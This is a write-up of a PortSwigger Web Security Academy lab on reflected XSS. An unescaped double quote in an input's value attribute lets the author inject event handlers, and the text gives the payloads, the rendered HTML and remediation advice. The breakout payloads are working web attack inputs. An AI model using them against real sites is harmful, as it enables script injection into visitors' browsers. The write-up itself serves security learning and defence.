# Lab: Reflected XSS into attribute with angle brackets HTML-encoded

## Overview

- **Category:** Cross-Site Scripting (Reflected XSS / Attribute Context)
- **Difficulty:** Apprentice
- **Platform:** PortSwigger Web Security Academy
- **Status:** Solved

This lab contains a reflected XSS vulnerability in the search blog functionality where angle brackets (`<` and `>`) are properly HTML-encoded (`&lt;` and `&gt;`), preventing the injection of new HTML tags. However, because the user input is reflected inside the double-quoted `value` attribute of an `<input>` element without encoding double quotes (`"`), an attacker can break out of the `value` attribute and inject a new event handler attribute directly onto the existing `<input>` tag.

---

## Attack Scenario & Mental Model

```text
ATTACKER GOAL
  Execute alert(1) in the browser via Reflected XSS
      ↓
VICTIM / DELIVERY
  User visiting a crafted search URL (`/?search=...`)
      ↓
SOURCE
  URL query parameter: GET /?search=...
      ↓
CONTEXT & FILTER ANALYSIS
  1. In the `<h1>` tag, `<`, `>`, and `"` are all HTML-encoded (`&lt;`, `&gt;`, `&quot;`).
  2. Inside `<input ... value="USER_INPUT">`, `<` and `>` are HTML-encoded,
     but the double quote (`"`) is NOT encoded.
      ↓
INJECTION (Attribute Breakout)
  Payload: test" onmouseover="alert(1)
  (or zero-click: test" autofocus onfocus="alert(1))
      ↓
SINK
  The server renders:
  <input type=text placeholder='Search the blog...' name=search value="test" onmouseover="alert(1)">
      ↓
BROWSER BEHAVIOR
  The browser parses the unescaped `"` as the closing quote of `value="test"`
  and treats `onmouseover="alert(1)"` (or `autofocus onfocus="alert(1)"`) as
  valid attributes on the `<input>` element.
      ↓
IMPACT
  Arbitrary JavaScript execution (`alert(1)`) in the victim's browser context.
```

---

## Step-by-Step Walkthrough

### 1. Probing the Reflection Contexts
Submitted a probe string containing both a double quote and angle brackets in the search box:

```text
test"<>
```

Inspected the raw HTML response in Burp Suite:

```html
<h1>0 search results for 'test&quot;&lt;&gt;'</h1>
...
<input type=text placeholder='Search the blog...' name=search value="test"&lt;&gt;">
```

Observation:
- Angle brackets (`<` and `>`) are encoded as `&lt;` and `&gt;` everywhere, so injecting a new tag (e.g., `<script>`) is impossible.
- Inside the `<input>` tag's `value` attribute, the double quote (`"`) is reflected unescaped, allowing us to terminate the `value` attribute early and add new attributes to the `<input>` tag.

### 2. Crafting the Attribute Context Payload
To close the `value` attribute and attach an event handler to the `<input>` element without using angle brackets, submitted:

```text
test" onmouseover="alert(1)
```

*(Alternatively, for immediate zero-click execution without moving the mouse: `test" autofocus onfocus="alert(1)`).*

### 3. Resulting HTML and Execution
The server rendered:

```html
<input type=text placeholder='Search the blog...' name=search value="test" onmouseover="alert(1)">
```

Moving the mouse over the input field (or triggering `onfocus`) executed `alert(1)` and solved the lab.

---

## Key Takeaways & Remediation

### Why Encoding Only `<` and `>` Is Insufficient
HTML encoding only `<` and `>` protects against tag injection in a general HTML body context, but it fails when untrusted data is placed inside an HTML attribute (`value="..."`). In an attribute context, an unescaped quote character (`"` or `'`) allows an attacker to break out of the attribute value and define new event handler attributes (`onfocus`, `onmouseover`, etc.) on the existing element.

### Remediation
- **Encode Quotes in Attribute Contexts:** Always encode double quotes (`"` → `&quot;`) and single quotes (`'` → `&#x27;` or `&#39;`) in addition to `<`, `>`, and `&` when reflecting user data inside HTML attributes.
- **Always Quote Attributes:** Ensure all HTML attributes are enclosed in quotes and matched with the corresponding context-aware encoding.
